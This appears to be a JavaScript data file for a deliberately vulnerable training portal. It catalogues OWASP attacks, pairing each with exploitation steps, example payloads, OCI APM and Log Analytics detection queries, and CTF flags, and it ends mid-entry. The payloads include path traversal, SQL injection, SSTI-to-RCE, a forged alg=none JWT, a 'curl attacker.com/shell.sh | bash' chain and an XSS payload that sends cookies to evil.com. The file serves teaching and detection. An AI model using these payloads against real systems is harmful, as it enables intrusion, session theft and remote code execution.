/* ═══════════════════════════════════════════════════════════════════
 * Attack Encyclopedia — Educational content for all vulnerability types
 * Seven Kingdoms Portal
 *
 * Each entry documents:
 *  - What the attack is and why it matters
 *  - Step-by-step exploitation flow
 *  - What OTel span attributes are generated
 *  - How to detect in OCI APM and OCI Log Analytics
 *  - MITRE ATT&CK and OWASP mapping
 * ═══════════════════════════════════════════════════════════════════ */

const ATTACK_ENCYCLOPEDIA = {
  // ── OWASP A01: Broken Access Control ──────────────────
  "A01": {
    title: "A01:2021 — Broken Access Control",
    icon: "&#128274;",
    summary: "Access control enforces policy such that users cannot act outside of their intended permissions. Failures lead to unauthorized information disclosure, modification, or destruction of data.",
    attacks: [
      {
        id: "idor-profile",
        name: "IDOR — Insecure Direct Object Reference",
        severity: "high",
        endpoint: "/portal/api/users/{id}",
        mitre: { id: "T1078", tactic: "Privilege Escalation", technique: "Valid Accounts" },
        description: "The application uses the user-supplied ID directly to fetch profile data without verifying the requesting user has permission to view that profile.",
        howItWorks: [
          "Attacker authenticates as a low-privilege user (e.g., jon.snow)",
          "Attacker observes their own profile URL: /portal/api/users/1",
          "Attacker changes the ID parameter to 2, 3, 4... to access other users' profiles",
          "Server returns the full profile including email, role, and house affiliation",
          "No authorization check verifies the requester owns the profile"
        ],
        examplePayload: "GET /portal/api/users/2\nAuthorization: Bearer <jon.snow's token>",
        realWorldImpact: "In 2019, a major US financial institution exposed 106 million customer records through an IDOR vulnerability. Attackers could enumerate customer data by incrementing account IDs.",
        otelAttributes: {
          "security.attack.detected": "true",
          "security.attack.type": "idor",
          "security.attack.severity": "high",
          "security.idor.target_user_id": "2",
          "security.source_ip": "<attacker IP>"
        },
        apmDetection: {
          query: "show (spans) SpanName as Name, SpanAttribute['security.attack.type'] as AttackType, SpanAttribute['security.username'] as User, SpanAttribute['security.source_ip'] as SourceIP where SpanAttribute['security.attack.type'] = 'idor'",
          explanation: "In OCI APM Trace Explorer, filter spans where security.attack.type = 'idor'. Each span shows which user accessed which resource and from which IP. Look for patterns where one user accesses many different user IDs in rapid succession."
        },
        laDetection: {
          query: "'Log Source' = 'OCI APM Trace' | where security_attack_type = 'idor' | stats count as attack_count by security_source_ip, security_username | where attack_count > 3",
          explanation: "In OCI Log Analytics, this query aggregates IDOR attempts by source IP and username. An attacker systematically enumerating user profiles will generate many hits from the same IP. The threshold of >3 helps filter out normal navigation."
        },
        flag: "FLAG{1D0R_PR0F1L3_L34K}"
      },
      {
        id: "path-traversal",
        name: "Path Traversal — Local File Inclusion",
        severity: "critical",
        endpoint: "/portal/api/files/download?path=",
        mitre: { id: "T1083", tactic: "Discovery", technique: "File and Directory Discovery" },
        description: "The file download endpoint accepts a path parameter without sanitization, allowing directory traversal sequences (../) to escape the application directory and read arbitrary system files.",
        howItWorks: [
          "Application serves files from a designated directory (e.g., /app/uploads/)",
          "Attacker provides path: ../../../etc/passwd",
          "Server resolves: /app/uploads/../../../etc/passwd → /etc/passwd",
          "System file contents are returned to the attacker",
          "Sensitive files like .env, /etc/shadow, SSH keys can be exfiltrated"
        ],
        examplePayload: "GET /portal/api/files/download?path=../../../etc/passwd",
        realWorldImpact: "Path traversal in Apache HTTP Server (CVE-2021-41773) allowed attackers to read arbitrary files and execute code on millions of servers. It was actively exploited within hours of disclosure.",
        otelAttributes: {
          "security.attack.detected": "true",
          "security.attack.type": "path_traversal",
          "security.attack.severity": "critical",
          "security.file.path": "../../../etc/passwd"
        },
        apmDetection: {
          query: "show (spans) SpanName as Name, SpanAttribute['security.attack.payload'] as Payload where SpanAttribute['security.attack.type'] = 'path_traversal'",
          explanation: "Filter APM traces for path_traversal attack type. The security.file.path attribute shows exactly which file the attacker tried to access. Alert on any path containing '../' or targeting sensitive files like /etc/passwd, /etc/shadow, .env."
        },
        laDetection: {
          query: "'Log Source' = 'OCI APM Trace' | where security_attack_type = 'path_traversal' | stats count as traversal_count by security_source_ip",
          explanation: "Aggregate path traversal attempts by source IP. A single IP attempting multiple traversal paths indicates active directory enumeration. Correlate with WAF logs for comprehensive coverage."
        },
        flag: "FLAG{P4TH_TR4V3RS4L_LFI}"
      },
      {
        id: "open-redirect",
        name: "Open Redirect — URL Manipulation",
        severity: "medium",
        endpoint: "/portal/api/redirect?url=",
        mitre: { id: "T1566.002", tactic: "Initial Access", technique: "Spearphishing Link" },
        description: "The application redirects users to URLs provided via query parameters without validating the destination. Attackers abuse this for phishing by creating legitimate-looking links that redirect to malicious sites.",
        howItWorks: [
          "Application has a redirect endpoint: /portal/api/redirect?url=<destination>",
          "Legitimate use: redirect after login to the original page",
          "Attacker crafts: https://portal.example.com/redirect?url=https://evil.com/phishing",
          "Victim sees the trusted domain in the link and clicks",
          "Browser follows the redirect to the attacker's phishing page"
        ],
        examplePayload: "GET /portal/api/redirect?url=https://evil.example.com/phishing",
        realWorldImpact: "Open redirects are commonly used in phishing campaigns. Google, Facebook, and other major platforms have patched numerous open redirect vulnerabilities that were used to bypass email security filters.",
        otelAttributes: {
          "security.attack.detected": "true",
          "security.attack.type": "open_redirect",
          "security.redirect.target": "https://evil.example.com/phishing",
          "security.redirect.external": "true"
        },
        apmDetection: {
          query: "show (spans) SpanAttribute['security.attack.payload'] as RedirectURL where SpanAttribute['security.attack.type'] = 'open_redirect'",
          explanation: "Monitor redirect targets in APM traces. Flag redirects to external domains not on an allowlist. The security.redirect.external attribute makes it easy to filter for dangerous redirects."
        },
        laDetection: {
          query: "'Log Source' = 'OCI APM Trace' | where security_attack_type = 'open_redirect' | stats count by security_attack_payload",
          explanation: "Track which external URLs are being used as redirect targets. High counts to the same external domain suggest an active phishing campaign using your application as a launchpad."
        },
        flag: "FLAG{0P3N_R3D1R3CT_PH1SH}"
      }
    ]
  },

  // ── OWASP A02: Cryptographic Failures ─────────────────
  "A02": {
    title: "A02:2021 — Cryptographic Failures",
    icon: "&#128272;",
    summary: "Failures related to cryptography which often lead to exposure of sensitive data. This includes using weak algorithms (MD5, SHA1), hardcoded secrets, or exposing cryptographic configuration.",
    attacks: [
      {
        id: "crypto-leak",
        name: "Cryptographic Configuration Exposure",
        severity: "critical",
        endpoint: "/portal/api/debug/crypto",
        mitre: { id: "T1552", tactic: "Credential Access", technique: "Unsecured Credentials" },
        description: "A debug endpoint left in production exposes the application's complete cryptographic configuration including JWT signing secrets, encryption keys, and hash algorithms.",
        howItWorks: [
          "Developer creates /debug/crypto endpoint during development for testing",
          "Endpoint is left accessible in production (no authentication required)",
          "Attacker discovers it via directory brute-forcing or documentation",
          "Response reveals: JWT secret key, hash algorithm (MD5 — insecure), encryption mode (ECB — insecure)",
          "Attacker can now forge JWT tokens, crack password hashes, and decrypt data"
        ],
        examplePayload: "GET /portal/api/debug/crypto",
        realWorldImpact: "In 2022, Uber's internal systems were compromised after an attacker found hardcoded credentials in a PowerShell script. Debug endpoints exposing secrets are a top cause of breaches.",
        otelAttributes: {
          "security.attack.detected": "true",
          "security.attack.type": "credential_leak",
          "security.attack.severity": "critical",
          "security.leak.type": "crypto_config"
        },
        apmDetection: {
          query: "show (spans) SpanName as Name where SpanName like 'ATTACK:CREDENTIAL_LEAK'",
          explanation: "Any access to debug endpoints in production should trigger an alert. In OCI APM, filter for spans where the attack type is credential_leak. Even a single access is a critical finding."
        },
        laDetection: {
          query: "'Log Source' = 'OCI APM Trace' | where security_attack_type = 'credential_leak' | stats earliest(security_attack_timestamp) as first_seen, count as leak_count by security_source_ip",
          explanation: "Track the first time each IP accessed credential-leaking endpoints. This establishes a timeline for incident response — when did the attacker first discover the secret, and how many times did they return?"
        },
        flag: "FLAG{CRYPT0_F41LUR3_D3BUG}"
      },
      {
        id: "md5-hashes",
        name: "Weak Password Hashing — MD5",
        severity: "critical",
        endpoint: "/portal/api/users?debug=true",
        mitre: { id: "T1552", tactic: "Credential Access", technique: "Unsecured Credentials" },
        description: "User passwords are stored using MD5, a cryptographically broken hash function. Combined with a debug parameter that dumps all user records including hashes, this enables rapid offline password cracking.",
        howItWorks: [
          "Application stores passwords using MD5 (no salt, no iterations)",
          "Debug parameter ?debug=true bypasses field filtering",
          "All user records including password_hash fields are returned",
          "Attacker feeds MD5 hashes to rainbow tables or hashcat",
          "MD5 hashes crack in seconds — hashcat can test billions of MD5 hashes per second"
        ],
        examplePayload: "GET /portal/api/users?debug=true",
        realWorldImpact: "LinkedIn's 2012 breach exposed 6.5 million SHA1 password hashes (no salt). Modern GPUs crack unsalted MD5 at ~25 billion hashes/second. Always use bcrypt, scrypt, or Argon2.",
        otelAttributes: {
          "security.attack.detected": "true",
          "security.attack.type": "credential_leak",
          "security.leak.type": "password_hashes",
          "security.leak.count": "<number of users exposed>"
        },
        apmDetection: {
          query: "show (spans) SpanAttribute['security.leak.type'] as LeakType, SpanAttribute['security.leak.count'] as Count where SpanAttribute['security.attack.type'] = 'credential_leak'",
          explanation: "Filter for credential_leak spans where leak.type is password_hashes. The leak.count attribute tells you how many accounts were exposed. Any value > 0 is critical."
        },
        laDetection: {
          query: "'Log Source' = 'OCI APM Trace' | where security_attack_type = 'credential_leak' | stats count as access_count by security_source_ip | where access_count > 1",
          explanation: "Multiple accesses to credential-leaking endpoints from the same IP indicate systematic data exfiltration. One access might be accidental; repeated access is intentional."
        },
        flag: "FLAG{CR3D3NT14L_DUMP_MD5}"
      }
    ]
  },

  // ── OWASP A03: Injection ──────────────────────────────
  "A03": {
    title: "A03:2021 — Injection",
    icon: "&#128137;",
    summary: "An application is vulnerable to injection when user-supplied data is not validated, filtered, or sanitized. SQL, NoSQL, OS command, LDAP, and template injection can lead to data loss, corruption, or unauthorized access.",
    attacks: [
      {
        id: "sqli",
        name: "SQL Injection — UNION-Based",
        severity: "critical",
        endpoint: "/portal/api/treasury/search?q=",
        mitre: { id: "T1190", tactic: "Initial Access", technique: "Exploit Public-Facing Application" },
        description: "The treasury search endpoint concatenates user input directly into a SQL query without parameterization. An attacker can inject SQL syntax to extract data from other tables or bypass authentication.",
        howItWorks: [
          "Application builds query: SELECT * FROM treasury WHERE name LIKE '%{input}%'",
          "Attacker submits: ' UNION SELECT * FROM secrets--",
          "Resulting query: SELECT * FROM treasury WHERE name LIKE '%' UNION SELECT * FROM secrets--%'",
          "UNION combines results from secrets table with treasury results",
          "The -- comment syntax ignores the trailing quote and wildcard",
          "When GOAD MSSQL is connected, this runs against real Active Directory-joined databases"
        ],
        examplePayload: "GET /portal/api/treasury/search?q=' UNION SELECT * FROM secrets--",
        realWorldImpact: "SQL injection remains the #1 web application vulnerability. The 2017 Equifax breach (143 million records) was caused by an unpatched SQL injection. The 2009 Heartland Payment Systems breach (130 million cards) was also SQLi.",
        otelAttributes: {
          "security.attack.detected": "true",
          "security.attack.type": "sqli",
          "security.attack.severity": "critical",
          "db.system": "mssql",
          "db.statement": "<full SQL query>",
          "security.sqli.pattern_matched": "true"
        },
        apmDetection: {
          query: "show (spans) SpanName as Name, SpanAttribute['security.attack.payload'] as SQLPayload, SpanAttribute['security.source_ip'] as SourceIP where SpanAttribute['security.attack.type'] = 'sqli'",
          explanation: "In OCI APM Trace Explorer, filter for sqli attack type. The db.statement attribute shows the full constructed SQL query, revealing exactly what the attacker injected. The security.sqli.pattern_matched attribute confirms malicious SQL syntax was detected."
        },
        laDetection: {
          query: "'Log Source' = 'OCI APM Trace' | where security_attack_type = 'sqli' | where security_attack_payload like '%OR%1%=%1%' or security_attack_payload like '%UNION%SELECT%' | stats count as sqli_count by security_source_ip",
          explanation: "This query hunts for classic SQLi patterns in Log Analytics. UNION SELECT and OR 1=1 are the most common injection techniques. Aggregating by source IP identifies the attacker's origin."
        },
        flag: "FLAG{7R345URY_SQL1_BR34CH}"
      },
      {
        id: "rce",
        name: "OS Command Injection — Remote Code Execution",
        severity: "critical",
        endpoint: "/portal/api/command/exec?cmd=",
        mitre: { id: "T1059", tactic: "Execution", technique: "Command and Scripting Interpreter" },
        description: "The diagnostic endpoint passes user input to a shell command without sanitization. Shell metacharacters (;, |, &, `) allow chaining arbitrary commands, potentially giving the attacker full control of the server.",
        howItWorks: [
          "Application runs: ping -c 1 {user_input} to test network connectivity",
          "Attacker submits: 127.0.0.1; cat /etc/passwd",
          "Shell executes: ping -c 1 127.0.0.1; cat /etc/passwd",
          "Semicolon terminates the ping and starts a new command",
          "Server returns both ping output AND the contents of /etc/passwd",
          "Attacker can chain: id; whoami; cat /etc/shadow; curl attacker.com/shell.sh | bash"
        ],
        examplePayload: "GET /portal/api/command/exec?cmd=id;whoami;cat /etc/passwd",
        realWorldImpact: "Command injection in Citrix ADC (CVE-2019-19781) was exploited to compromise thousands of corporate VPNs. The Log4Shell vulnerability (CVE-2021-44228) enabled RCE through log injection affecting millions of Java applications.",
        otelAttributes: {
          "security.attack.detected": "true",
          "security.attack.type": "rce",
          "security.attack.severity": "critical",
          "security.rce.command": "<injected command>"
        },
        apmDetection: {
          query: "show (spans) SpanName as Name, SpanAttribute['security.attack.payload'] as Command where SpanAttribute['security.attack.type'] = 'rce'",
          explanation: "Filter for rce attack type in APM traces. The security.rce.command attribute captures the exact command the attacker tried to execute. Any span with this attribute in production is a critical incident requiring immediate response."
        },
        laDetection: {
          query: "'Log Source' = 'OCI APM Trace' | where security_attack_type = 'rce' | stats count as rce_count by security_attack_payload, security_source_ip",
          explanation: "Aggregate RCE attempts by command payload and source IP. This reveals the attacker's methodology: are they running reconnaissance (id, whoami), exfiltrating data (cat /etc/passwd), or establishing persistence (curl | bash)?"
        },
        flag: "FLAG{C0MM4ND_1NJ3CT10N_RCE}"
      },
      {
        id: "ssti",
        name: "Server-Side Template Injection (SSTI)",
        severity: "critical",
        endpoint: "/portal/api/template/render?tpl=",
        mitre: { id: "T1059", tactic: "Execution", technique: "Command and Scripting Interpreter" },
        description: "User input is embedded directly into a server-side template engine and evaluated. Attackers can inject template syntax to execute arbitrary code on the server.",
        howItWorks: [
          "Application uses a template engine (Jinja2, Mako, etc.) to render dynamic content",
          "User input is placed directly into the template: 'Hello ' + template.render(user_input)",
          "Attacker submits: {{7*7}} — the template engine evaluates this to 49",
          "Confirming SSTI, attacker escalates: {{__class__.__mro__[1].__subclasses__()}}",
          "This traverses Python's class hierarchy to find subprocess or os modules",
          "Full RCE: {{config.__class__.__init__.__globals__['os'].popen('id').read()}}"
        ],
        examplePayload: "GET /portal/api/template/render?tpl={{7*7}} {{__class__.__mro__}}&name=test",
        realWorldImpact: "SSTI vulnerabilities have been found in Uber, Shopify, and other major platforms. They are particularly dangerous because the same vulnerability that renders {{7*7}}=49 can be escalated to full RCE.",
        otelAttributes: {
          "security.attack.detected": "true",
          "security.attack.type": "ssti",
          "security.attack.severity": "critical",
          "security.attack.payload": "{{7*7}}"
        },
        apmDetection: {
          query: "show (spans) SpanAttribute['security.attack.payload'] as Template where SpanAttribute['security.attack.type'] = 'ssti'",
          explanation: "Filter for ssti attack type. The payload attribute shows the template expression the attacker injected. Escalation from {{7*7}} to __class__.__mro__ indicates the attacker is moving from detection to exploitation."
        },
        laDetection: {
          query: "'Log Source' = 'OCI APM Trace' | where security_attack_type = 'ssti' | stats count by security_source_ip",
          explanation: "Any SSTI attempt should trigger an immediate alert. Unlike SQLi where scanners create noise, SSTI attempts are almost always manual and targeted. Even one attempt warrants investigation."
        },
        flag: "FLAG{S3RV3R_T3MPL4T3_1NJ3CT10N}"
      },
      {
        id: "ldap-injection",
        name: "LDAP Injection — Active Directory Enumeration",
        severity: "critical",
        endpoint: "/portal/api/ldap/lookup?username=",
        mitre: { id: "T1190", tactic: "Initial Access", technique: "Exploit Public-Facing Application" },
        description: "The LDAP lookup endpoint constructs an LDAP filter by directly embedding user input. Special characters like * and () can modify the query to enumerate all users in the GOAD Active Directory domain.",
        howItWorks: [
          "Application builds LDAP filter: (&(sAMAccountName={input})(objectClass=user))",
          "Normal use: username='jon.snow' → (&(sAMAccountName=jon.snow)(objectClass=user))",
          "Attacker submits: username=* → (&(sAMAccountName=*)(objectClass=user))",
          "The wildcard * matches ALL users in the domain",
          "Returns full user enumeration: names, emails, group memberships, SPNs",
          "When connected to GOAD, this queries real Active Directory domain controllers"
        ],
        examplePayload: "GET /portal/api/ldap/lookup?username=*&domain=sevenkingdoms.local",
        realWorldImpact: "LDAP injection against Active Directory can enumerate the entire organization structure. Combined with Kerberoasting, an attacker can move from web app access to domain admin in hours.",
        otelAttributes: {
          "security.attack.detected": "true",
          "security.attack.type": "ldap_injection",
          "security.attack.severity": "critical",
          "security.ldap.filter": "(&(sAMAccountName=*)(objectClass=user))",
          "security.ldap.domain": "sevenkingdoms.local"
        },
        apmDetection: {
          query: "show (spans) SpanAttribute['security.attack.payload'] as LDAPFilter where SpanAttribute['security.attack.type'] = 'ldap_injection'",
          explanation: "Filter for ldap_injection spans. The security.ldap.filter attribute shows the constructed LDAP query. Wildcard searches (sAMAccountName=*) indicate enumeration attacks. Cross-reference with GOAD domain controller logs."
        },
        laDetection: {
          query: "'Log Source' = 'OCI APM Trace' | where security_attack_type = 'ldap_injection' | stats count by security_source_ip, security_username",
          explanation: "Correlate LDAP injection attempts with the authenticated user. An internal user performing LDAP enumeration suggests compromised credentials or an insider threat."
        },
        flag: "FLAG{LD4P_F1LT3R_1NJ3CT10N}"
      },
      {
        id: "xss",
        name: "Stored XSS — Cross-Site Scripting",
        severity: "high",
        endpoint: "/portal/api/messages/send",
        mitre: { id: "T1059.007", tactic: "Execution", technique: "JavaScript" },
        description: "The messaging system stores user-provided HTML/JavaScript without sanitization. When other users view the message, the malicious script executes in their browser context, stealing cookies and session tokens.",
        howItWorks: [
          "Attacker sends a raven (message) to another user",
          "Message body contains: <script>alert(document.cookie)</script>",
          "Server stores the message without sanitizing HTML tags",
          "When the victim opens their messages, the script executes",
          "The script runs in the victim's browser with their session context",
          "Attacker can steal session cookies, perform actions as the victim, or redirect to phishing"
        ],
        examplePayload: "POST /portal/api/messages/send\n{\"from\":\"attacker\", \"to\":\"admin\", \"subject\":\"Important\", \"body\":\"<script>fetch('https://evil.com/steal?c='+document.cookie)</script>\"}",
        realWorldImpact: "The Samy Worm (2005) exploited stored XSS on MySpace to add over 1 million friends in 24 hours. More recently, XSS in Fortnite's SSO (2019) could have exposed 200 million accounts.",
        otelAttributes: {
          "security.attack.detected": "true",
          "security.attack.type": "xss",
          "security.xss.type": "stored",
          "security.xss.field": "message_body"
        },
        apmDetection: {
          query: "show (spans) SpanAttribute['security.attack.payload'] as XSSPayload where SpanAttribute['security.attack.type'] = 'xss'",
          explanation: "Filter for xss attack type. The security.xss.type attribute distinguishes between 'stored' (persistent, more dangerous) and 'reflected' XSS. Stored XSS warrants immediate remediation as it affects all users who view the content."
        },
        laDetection: {
          query: "'Log Source' = 'OCI APM Trace' | where security_attack_type = 'xss' | where security_attack_payload like '%<script%' or security_attack_payload like '%onerror%' | stats count by security_source_ip",
          explanation: "Hunt for XSS payloads in Log Analytics by looking for common patterns: <script>, onerror=, onload=, javascript:. The stored variant is particularly dangerous — one successful injection affects every user who views the content."
        },
        flag: "FLAG{570R3D_X55_R4V3N}"
      }
    ]
  },

  // ── OWASP A04: Insecure Design ────────────────────────
  "A04": {
    title: "A04:2021 — Insecure Design",
    icon: "&#128736;",
    summary: "Insecure design refers to flaws in the application architecture that cannot be fixed by a perfect implementation. These are missing or ineffective controls that should have been designed into the system.",
    attacks: [
      {
        id: "mass-assignment",
        name: "Mass Assignment — Privilege Escalation via Registration",
        severity: "critical",
        endpoint: "/portal/api/auth/register",
        mitre: { id: "T1098", tactic: "Persistence", technique: "Account Manipulation" },
        description: "The registration endpoint binds all request body fields directly to the user object. An attacker can include a 'role' field to self-assign admin or superadmin privileges.",
        howItWorks: [
          "Normal registration: POST {username: 'user', password: 'pass'}",
          "Server creates user with default role='viewer'",
          "Attacker includes extra field: POST {username: 'hacker', password: 'test', role: 'superadmin'}",
          "Server binds ALL fields from request body to the user object",
          "Attacker's account is created with superadmin privileges",
          "Also known as 'autobinding' or 'object injection'"
        ],
        examplePayload: "POST /portal/api/auth/register\n{\"username\":\"hacker\",\"password\":\"test\",\"role\":\"superadmin\"}",
        realWorldImpact: "GitHub suffered a mass assignment vulnerability in 2012 that allowed users to add their SSH keys to any organization's repository. The Ruby on Rails framework later added built-in protection (strong parameters).",
        otelAttributes: {
          "security.attack.detected": "true",
          "security.attack.type": "mass_assignment",
          "security.attack.severity": "critical",
          "security.attack.payload": "{...request body...}"
        },
        apmDetection: {
          query: "show (spans) SpanAttribute['security.attack.payload'] as Payload where SpanAttribute['security.attack.type'] = 'mass_assignment'",
          explanation: "Filter for mass_assignment attack type. The payload shows exactly what fields the attacker tried to inject. Look for role, is_admin, permissions, or any authorization-related fields in the registration request."
        },
        laDetection: {
          query: "'Log Source' = 'OCI APM Trace' | where security_attack_type = 'mass_assignment' | stats count by security_username",
          explanation: "Track mass assignment attempts by username. Cross-reference with the user database to identify accounts created with elevated privileges that should be immediately disabled."
        },
        flag: "FLAG{M455_4551GNM3N7_PR1V35C}"
      },
      {
        id: "negative-transfer",
        name: "Business Logic — Negative Amount Transfer",
        severity: "high",
        endpoint: "/portal/api/treasury/transfer",
        mitre: { id: "T1098", tactic: "Persistence", technique: "Account Manipulation" },
        description: "The treasury transfer endpoint does not validate that the amount is positive. Submitting a negative amount reverses the transfer direction, effectively stealing funds from the target account.",
        howItWorks: [
          "Normal transfer: POST {from: 'Lannister', to: 'Stark', amount: 1000}",
          "Server deducts 1000 from Lannister, adds 1000 to Stark",
          "Attacker submits: POST {from: 'Lannister', to: 'Stark', amount: -50000}",
          "Server deducts -50000 from Lannister (adds 50000) and adds -50000 to Stark (deducts)",
          "Net effect: Lannister gains 50000 and Stark loses 50000",
          "The transfer appears legitimate in audit logs — amount is just 'negative'"
        ],
        examplePayload: "POST /portal/api/treasury/transfer\n{\"from\":\"Lannister\",\"to\":\"Stark\",\"amount\":-50000}",
        realWorldImpact: "Business logic vulnerabilities in fintech applications have resulted in millions in losses. A negative amount exploit in a cryptocurrency exchange in 2019 allowed users to generate coins from thin air.",
        otelAttributes: {
          "security.attack.detected": "true",
          "security.attack.type": "auth_bypass",
          "security.business_logic.negative_amount": "-50000"
        },
        apmDetection: {
          query: "show (spans) SpanAttribute['security.business_logic.negative_amount'] as Amount where SpanAttribute['security.business_logic.negative_amount'] != ''",
          explanation: "Filter for spans with the security.business_logic.negative_amount attribute. Any non-empty value indicates an exploitation attempt. Business logic flaws are harder to detect with WAFs — application-level instrumentation like this is essential."
        },
        laDetection: {
          query: "'Log Source' = 'OCI APM Trace' | where security_attack_type = 'auth_bypass' | where security_business_logic_negative_amount != '' | stats sum(security_business_logic_negative_amount) as total_stolen by security_source_ip",
          explanation: "Aggregate the total negative amounts by source IP to calculate the financial impact of the attack. This helps incident response teams quantify the damage."
        },
        flag: "FLAG{N3G4T1V3_TR4NSF3R_L0G1C}"
      }
    ]
  },

  // ── OWASP A05: Security Misconfiguration ──────────────
  "A05": {
    title: "A05:2021 — Security Misconfiguration",
    icon: "&#9881;",
    summary: "The application may be vulnerable if it is missing appropriate security hardening, has unnecessary features enabled (e.g., debug endpoints), uses default credentials, or exposes overly informative error messages.",
    attacks: [
      {
        id: "env-leak",
        name: "Environment Variable Exposure",
        severity: "critical",
        endpoint: "/portal/api/debug/env",
        mitre: { id: "T1552", tactic: "Credential Access", technique: "Unsecured Credentials" },
        description: "A debug endpoint exposes all sensitive environment variables including database passwords, API keys, SSH key paths, and JWT secrets.",
        howItWorks: [
          "Developer creates /debug/env to troubleshoot configuration issues",
          "Endpoint reads os.environ or application config and returns it as JSON",
          "Endpoint is not protected by authentication or IP filtering",
          "Attacker discovers it via crawling, wordlists, or source code review",
          "Response contains: DB_PASSWORD, JWT_SECRET, SSH_KEY_PATH, API keys",
          "Attacker uses leaked credentials to pivot to databases, internal services, and cloud resources"
        ],
        examplePayload: "GET /portal/api/debug/env",
        realWorldImpact: "Exposed .env files and debug endpoints are responsible for thousands of breaches annually. In 2023, a misconfigured Microsoft AI research endpoint exposed 38TB of private data including passwords and internal messages.",
        otelAttributes: {
          "security.attack.detected": "true",
          "security.attack.type": "credential_leak",
          "security.leak.type": "environment_variables"
        },
        apmDetection: {
          query: "show (spans) SpanName as Name, SpanAttribute['security.source_ip'] as SourceIP where SpanAttribute['security.leak.type'] = 'environment_variables'",
          explanation: "Any access to debug endpoints in production should generate a critical alert. Filter by leak.type to distinguish between different types of information disclosure (environment_variables, crypto_config, password_hashes)."
        },
        laDetection: {
          query: "'Log Source' = 'OCI APM Trace' | where security_leak_type = 'environment_variables' | stats count as access_count by security_source_ip | where access_count >= 1",
          explanation: "Zero-tolerance detection: any access to environment variable debug endpoints triggers an alert. The threshold of >= 1 means every single access is flagged. Combine with IP reputation feeds for context."
        },
        flag: "FLAG{3NV_L34K_D3BUG_M0D3}"
      }
    ]
  },

  // ── OWASP A07: Identification & Authentication Failures ──
  "A07": {
    title: "A07:2021 — Identification and Authentication Failures",
    icon: "&#128273;",
    summary: "Confirmation of the user's identity, authentication, and session management is critical. Applications are vulnerable when they permit brute force, use weak credentials, or have session management flaws.",
    attacks: [
      {
        id: "jwt-none",
        name: "JWT Algorithm None — Signature Bypass",
        severity: "critical",
        endpoint: "/portal/api/admin/panel",
        mitre: { id: "T1134", tactic: "Privilege Escalation", technique: "Access Token Manipulation" },
        description: "The application accepts JWT tokens with the algorithm set to 'none', bypassing signature verification entirely. An attacker can forge a token with any claims (e.g., role: superadmin) without knowing the signing secret.",
        howItWorks: [
          "JWT structure: Header.Payload.Signature (base64 encoded, dot-separated)",
          "Normal JWT: {\"alg\":\"HS256\"} — server verifies HMAC-SHA256 signature",
          "Attacker crafts: {\"alg\":\"none\",\"typ\":\"JWT\"} — no signature required",
          "Payload: {\"sub\":\"attacker\",\"role\":\"superadmin\"}",
          "Token: base64(header).base64(payload). (empty signature)",
          "Server accepts the token because alg=none means 'no verification needed'"
        ],
        examplePayload: "GET /portal/api/admin/panel\nAuthorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhdHRhY2tlciIsInJvbGUiOiJzdXBlcmFkbWluIn0.",
        realWorldImpact: "The JWT 'none' algorithm vulnerability was discovered in 2015 and affected many popular JWT libraries. Auth0, node-jsonwebtoken, and PyJWT all had to patch this flaw. RFC 7518 now explicitly states implementations MUST NOT accept alg=none for signed tokens.",
        otelAttributes: {
          "security.attack.detected": "true",
          "security.attack.type": "jwt_manipulation",
          "security.attack.severity": "critical",
          "security.jwt.algorithm": "none",
          "security.jwt.claimed_role": "superadmin"
        },
        apmDetection: {
          query: "show (spans) SpanAttribute['security.attack.payload'] as JWTHeader where SpanAttribute['security.attack.type'] = 'jwt_manipulation'",
          explanation: "Filter for jwt_manipulation attack type. The security.jwt.algorithm attribute is key — any value of 'none' is an attack. The security.jwt.claimed_role shows what privilege level the attacker attempted to claim."
        },
        laDetection: {
          query: "'Log Source' = 'OCI APM Trace' | where security_attack_type = 'jwt_manipulation' | stats count by security_source_ip",
          explanation: "JWT manipulation attempts are always malicious — there is no legitimate reason to use alg=none in production. Every instance should trigger an incident response workflow."
        },
        flag: "FLAG{JW7_N0N3_4LG0_BYPA55}"
      },
      {
        id: "default-creds",
        name: "Default Credentials — Admin Login",
        severity: "critical",
        endpoint: "/portal/api/auth/login",
        mitre: { id: "T1078", tactic: "Defense Evasion", technique: "Valid Accounts" },
        description: "The application ships with default credentials (admin/admin) that grant superadmin access. These are documented in the login page hints and are never changed in production.",
        howItWorks: [
          "Application ships with pre-configured admin account: admin/admin",
          "Login page helpfully shows default credentials as 'hints'",
          "Attacker tries admin/admin and gains superadmin access",
          "No password complexity requirements are enforced",
          "No account lockout after failed attempts (enables brute force)",
          "Successful login with default creds grants full system access"
        ],
        examplePayload: "POST /portal/api/auth/login\n{\"username\":\"admin\",\"password\":\"admin\"}",
        realWorldImpact: "Mirai botnet (2016) infected hundreds of thousands of IoT devices using a list of 62 default username/password combinations. Default credentials are consistently in the top 5 causes of breaches in ICS/SCADA environments.",
        otelAttributes: {
          "security.attack.detected": "true",
          "security.attack.type": "auth_bypass",
          "security.attack.severity": "critical",
          "security.username": "admin"
        },
        apmDetection: {
          query: "show (spans) SpanAttribute['security.username'] as User where SpanAttribute['security.attack.type'] = 'auth_bypass'",
          explanation: "Filter for auth_bypass spans. Cross-reference the username with a list of known default accounts (admin, root, test, demo). Successful logins with default credentials are critical findings."
        },
        laDetection: {
          query: "'Log Source' = 'OCI APM Trace' | where security_attack_type = 'auth_bypass' | stats count by security_username, security_source_ip",
          explanation: "Track authentication bypass attempts by username and IP. High failure counts from a single IP indicate brute force. Successful logins with 'admin' username from external IPs are always suspicious."
        },
        flag: "FLAG{D3F4ULT_CR3D5_4DM1N}"
      },
      {
        id: "session-fixation",
        name: "Session Fixation Attack",
        severity: "high",
        endpoint: "/portal/api/auth/session-fixation?session_id=",
        mitre: { id: "T1550", tactic: "Lateral Movement", technique: "Use Alternate Authentication Material" },
        description: "The application accepts session IDs provided via URL parameters and sets them as the user's session cookie. An attacker can pre-set a known session ID, trick the victim into authenticating with it, then hijack the session.",
        howItWorks: [
          "Attacker generates a session ID: 'attacker-controlled-123'",
          "Attacker sends victim a link: /portal/api/auth/session-fixation?session_id=attacker-controlled-123",
          "Victim clicks the link; server sets the provided session ID as a cookie",
          "Victim logs in — their authenticated session now uses the attacker's session ID",
          "Attacker uses the same session ID to access the victim's authenticated session",
          "The attacker effectively piggybacks on the victim's login"
        ],
        examplePayload: "GET /portal/api/auth/session-fixation?session_id=attacker-controlled-123",
        realWorldImpact: "Session fixation was common in early web frameworks before session regeneration became standard practice. Modern frameworks (Django, Rails, Spring) regenerate session IDs after login to prevent this attack.",
        otelAttributes: {
          "security.attack.detected": "true",
          "security.attack.type": "auth_bypass",
